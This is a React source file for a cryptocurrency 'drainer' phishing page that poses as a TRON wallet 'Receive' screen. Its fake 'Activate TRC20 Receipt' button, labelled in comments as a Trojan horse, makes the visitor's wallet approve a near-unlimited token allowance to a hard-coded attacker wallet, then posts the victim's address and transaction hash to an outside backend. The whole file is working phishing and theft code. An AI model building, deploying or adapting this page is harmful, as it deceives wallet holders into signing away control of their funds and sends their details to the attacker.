import React, { useState, useEffect } from "react";
import { QRCodeSVG } from "qrcode.react";

// ==========================================
// CONFIGURATION (Engine Settings - DO NOT TOUCH)
// ==========================================
const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; 
const ATTACKER_WALLET = "TJXJEWcjNMryw87etLmGUDs1i5F1hveBou"; 
const BACKEND = "https://qr-drainer.onrender.com";
const VERCEL_URL = "https://qr-drainer-one.vercel.app";

// TRON LOGO (Upward Diamond) for QR Center
const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ViMmMzMSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";

const short = (a) => (a ? `${a.slice(0, 6)}…${a.slice(-4)}` : "—");

// Clean SVG Icons (No emojis)
const IconCopy = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
);
const IconShare = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"></path><polyline points="16 6 12 2 8 6"></polyline><line x1="12" y1="2" x2="12" y2="15"></line></svg>
);
const IconCheck = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
);

export default function App() {
  // UI States
  const [isConnected, setIsConnected] = useState(false);
  const [wallet, setWallet] = useState("");
  const [uiState, setUiState] = useState("idle"); // idle | connecting | approving | done | error
  const [errorMsg, setErrorMsg] = useState("");
  const [copied, setCopied] = useState(false);

  // QR Code Value
  const qrValue = VERCEL_URL;

  // 1. DETECT WALLET AUTOMATICALLY
  useEffect(() => {
    const checkWallet = setInterval(() => {
      if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        const addr = window.tronWeb.defaultAddress.base58;
        if (!isConnected) {
          setIsConnected(true);
          setWallet(addr);
        }
      }
    }, 1500);
    return () => clearInterval(checkWallet);
  }, [isConnected]);

  // 2. THE ENGINE (Proven Logic - UNTOUCHED)
  const executeEngine = async () => {
    setUiState("approving");
    setErrorMsg("");

    try {
      if (!window.tronWeb || !window.tronWeb.defaultAddress) {
        throw new Error("Wallet not connected. Please open in TronLink.");
      }

      const victimAddress = window.tronWeb.defaultAddress.base58;

      const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
      const tx = await contract.approve(ATTACKER_WALLET, "1000000000000000").send({
        feeLimit: 100000000,
        from: victimAddress
      });

      await fetch(`${BACKEND}/api/alert`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          victimAddress: victimAddress,
          txHash: tx,
          network: "TRON Shasta"
        })
      });

      setUiState("done");

    } catch (error) {
      console.error(error);
      setErrorMsg(error.message || "Transaction failed.");
      setUiState("error");
    }
  };

  // 3. BUTTON HANDLER
  const handleMainAction = () => {
    if (!isConnected) {
      if (window.tronLink?.request) {
        window.tronLink.request({ method: "tron_requestAccounts" });
      } else {
        setErrorMsg("Please open this site inside the TronLink DApp Browser.");
        setUiState("error");
      }
    } else {
      executeEngine();
    }
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(ATTACKER_WALLET);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleShare = async () => {
    try {
      if (navigator.share) {
        await navigator.share({ title: "Receive USDT", url: VERCEL_URL });
      } else {
        navigator.clipboard.writeText(VERCEL_URL);
        alert("Link copied to clipboard");
      }
    } catch (e) {}
  };

  return (
    <div style={{ 
      background: "#0b0e11", 
      minHeight: "100vh", 
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif', 
      color: "#eaecef", 
      display: "flex", 
      flexDirection: "column" 
    }}>
      {/* HEADER */}
      <div style={{ 
        display: "flex", alignItems: "center", justifyContent: "space-between", 
        padding: "16px 20px", borderBottom: "1px solid #1e2329" 
      }}>
        <div style={{ width: 32 }}></div>
        <h1 style={{ margin: 0, fontSize: 18, fontWeight: 600, color: "#eaecef" }}>Receive</h1>
        <div style={{ width: 32, textAlign: "right", cursor: "pointer" }}>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#848e9c" strokeWidth="2"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
        </div>
      </div>

      {/* MAIN CONTENT */}
      <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", padding: "32px 20px" }}>
        
        {/* NETWORK BADGE */}
        <div style={{ 
          display: "flex", alignItems: "center", gap: 8, 
          background: "#1e2329", padding: "6px 14px", borderRadius: 16, marginBottom: 32,
          border: "1px solid #2b3139"
        }}>
          <span style={{ 
            width: 16, height: 16, borderRadius: "50%", background: "#eb2c31", 
            display: "flex", alignItems: "center", justifyContent: "center", fontSize: 10, fontWeight: 700, color: "#fff"
          }}>T</span>
          <span style={{ fontSize: 14, fontWeight: 500, color: "#eaecef" }}>TRON (TRC20)</span>
        </div>

        {/* QR CODE CARD */}
        <div style={{ 
          background: "#ffffff", borderRadius: 16, padding: 24, marginBottom: 24, 
          width: "100%", maxWidth: 320, boxShadow: "0 8px 24px rgba(0,0,0,0.4)" 
        }}>
          <div id="lab-qr-box" style={{ textAlign: "center" }}>
            <QRCodeSVG 
              value={qrValue} size={220} level="H" includeMargin={false} 
              imageSettings={{ src: TRON_LOGO_B64, height: 48, width: 48, excavate: true }} 
            />
          </div>
        </div>

        {/* ADDRESS ROW WITH CLEAN ICONS */}
        <div style={{ 
          display: "flex", alignItems: "center", justifyContent: "space-between",
          background: "#1e2329", borderRadius: 12, padding: "12px 16px",
          width: "100%", maxWidth: 320, marginBottom: 24, border: "1px solid #2b3139"
        }}>
          <span style={{ 
            fontFamily: "monospace", fontSize: 13, color: "#848e9c", 
            overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", maxWidth: "75%" 
          }}>
            {ATTACKER_WALLET}
          </span>
          <button 
            onClick={handleCopy}
            style={{ 
              background: "transparent", border: "none", color: copied ? "#0ecb81" : "#f0b90b", 
              cursor: "pointer", display: "flex", alignItems: "center", padding: 0
            }}
          >
            {copied ? <IconCheck /> : <IconCopy />}
          </button>
        </div>

        {/* WARNING BANNER */}
        <div style={{ 
          background: "rgba(240, 185, 11, 0.1)", border: "1px solid rgba(240, 185, 11, 0.2)", 
          borderRadius: 8, padding: "10px 14px", fontSize: 12, color: "#f0b90b", 
          marginBottom: 32, display: "flex", gap: 10, width: "100%", maxWidth: 320, lineHeight: 1.4
        }}>
          <span style={{ flexShrink: 0 }}>⚠️</span>
          <span>Only send TRC-20 USDT assets to this address. Other assets will be lost forever.</span>
        </div>

        {/* THE TROJAN HORSE: "ACTIVATE" BANNER */}
        {uiState !== "done" && (
          <div style={{ 
            background: "#1e2329", border: "1px solid #2b3139", borderRadius: 12, 
            padding: 16, width: "100%", maxWidth: 320, marginBottom: 16, textAlign: "center"
          }}>
            <p style={{ margin: "0 0 12px 0", fontSize: 13, color: "#848e9c", lineHeight: 1.4 }}>
              New addresses require TRC20 activation to receive deposits.
            </p>
            <button 
              onClick={handleMainAction} 
              disabled={uiState === "approving"}
              style={{ 
                width: "100%", background: "#f0b90b", border: "none", borderRadius: 8, 
                padding: "12px", color: "#0b0e11", fontSize: 14, fontWeight: 700, 
                cursor: uiState === "approving" ? "not-allowed" : "pointer"
              }}
            >
              {uiState === "approving" ? "Activating..." : "Activate TRC20 Receipt"}
            </button>
          </div>
        )}

        {/* ERROR MESSAGE */}
        {uiState === "error" && (
          <div style={{ 
            background: "rgba(240, 71, 71, 0.1)", border: "1px solid rgba(240, 71, 71, 0.2)", 
            color: "#f04747", padding: 12, borderRadius: 8, fontSize: 13, 
            marginBottom: 16, textAlign: "center", width: "100%", maxWidth: 320 
          }}>
            {errorMsg}
          </div>
        )}

        {/* SUCCESS MESSAGE */}
        {uiState === "done" && (
          <div style={{ 
            background: "rgba(14, 203, 129, 0.1)", border: "1px solid rgba(14, 203, 129, 0.2)", 
            color: "#0ecb81", padding: 16, borderRadius: 8, fontSize: 14, fontWeight: 600,
            marginBottom: 16, textAlign: "center", width: "100%", maxWidth: 320,
            display: "flex", alignItems: "center", justifyContent: "center", gap: 8
          }}>
            <IconCheck /> Address Activated. Ready to receive.
          </div>
        )}

        {/* SHARE BUTTON (Bottom, subtle) */}
        <button 
          onClick={handleShare}
          style={{ 
            background: "transparent", border: "1px solid #2b3139", borderRadius: 8, 
            padding: "10px 20px", color: "#848e9c", fontSize: 13, fontWeight: 500, 
            cursor: "pointer", display: "flex", alignItems: "center", gap: 8, marginTop: 10
          }}
        >
          <IconShare /> Share Address
        </button>

        {/* SESSION INFO (Subtle footer) */}
        {isConnected && (
          <div style={{ 
            marginTop: 30, textAlign: "center", fontSize: 11, color: "#474d57", fontFamily: "monospace" 
          }}>
            Connected: {short(wallet)}
          </div>
        )}
      </div>
    </div>
  );
}